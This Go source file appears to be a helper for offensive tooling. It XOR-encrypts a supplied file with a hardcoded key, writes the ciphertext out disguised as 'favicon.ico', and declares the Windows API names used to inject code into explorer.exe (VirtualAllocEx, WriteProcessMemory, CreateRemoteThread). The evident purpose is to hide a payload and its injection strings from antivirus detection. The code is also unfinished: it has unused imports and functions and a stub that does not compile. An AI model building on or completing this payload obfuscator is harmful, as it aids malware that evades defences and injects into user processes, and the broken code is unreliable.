package main

import (
    "flag"
    "io/ioutil"
    "fmt"
    "os"
    "strings"
    "text/template"
    dbg "github.com/oonray/godbg"
)


type VAR struct {
    name string
    value string
    tmp_val string
}

type VARS struct {
    key VAR
    dll VAR
    virtualalloc VAR
    writeprocessmemory VAR
    createremotethread VAR
    createtoolhelp32snapshot VAR
    rtlmovememory VAR
    explorer VAR
    process32first VAR
    process32next VAR
}

func xorstr(data string,key string) []byte {
    fmt.Printf("%s\n",data)
    out := make([]byte,len(data)+1)
    for i:=0; i<len(data);i++ {
        out[i] = data[i]^key[i%len(key)]
    }
    out[len(data)] = 0x00
    return out
}

func xor(data []byte,key string) []byte{
    out:=make([]byte,len(data))

    for i:=0; i<len(data);i++ {
        out[i] = data[i]^key[i%len(key)]
    }
    return out
}

func printCipher(data []byte) {
    fmt.Printf("%d\n",len(data)-1)
    fmt.Printf("{ ")
    for bt:=0; bt<len(data)-1; bt++ {
        fmt.Printf(" 0x%02x,",data[bt])
    }
    fmt.Printf("0x%x",data[len(data)-1])
    fmt.Printf(" };\n")
}

func writeToFile(file string,data []byte) (int, error){
    defer dbg.Rec()
    var err error
    err = nil

    dbg.Check(len(data) <= 0, "Got no data!")

    f, err := os.Create(file)
    defer f.Close()
    dbg.Check_error(err,fmt.Sprintf("Could not create %s",file))

    n, err := f.Write(data)
    dbg.Check(n<=0, "Did not Write Any data to file")
    dbg.Check_error(err,fmt.Sprintf("Could not write to %s",file))

    return n,err
}

func Temp_str(){
    template:= "char {.name}[] = {.value}"

}

func main(){
    var data []byte
    var filename string


    vars:= VARS{
        key:VAR{"mysecretkeee","",""},
        dll:VAR{"kernel32.dll","",""},
        virtualalloc:VAR{"VirtualAllocEx","",""},
        writeprocessmemory:VAR{"WriteProcessMemory","",""},
        createremotethread:VAR{"CreateRemoteThread","",""},
        createtoolhelp32snapshot:VAR{"CreateToolhelp32Snapshot","",""},
        rtlmovememory:VAR{"RtlMoveMemory","",""},
        explorer:VAR{"explorer.exe","",""},
        process32first:VAR{"Process32First","",""},
        process32next:VAR{"Process32Next","",""},
    }

    flag.StringVar(&filename,"f","","the file to xor")
    flag.Parse()
    dbg.Check(strings.Compare(filename,"")==0, "You must suply a filename with -f")

    fileinfo, err := os.Stat(filename)
    dbg.Check_error(err,"File error")
    dbg.Check(fileinfo.IsDir(),"File is a Directory")

    data,_ = ioutil.ReadFile(filename)
    dbg.Check(len(data)<=0, "File is empty")

    cipher := xor(data,vars.key.name)
    writeToFile("favicon.ico",cipher)
}
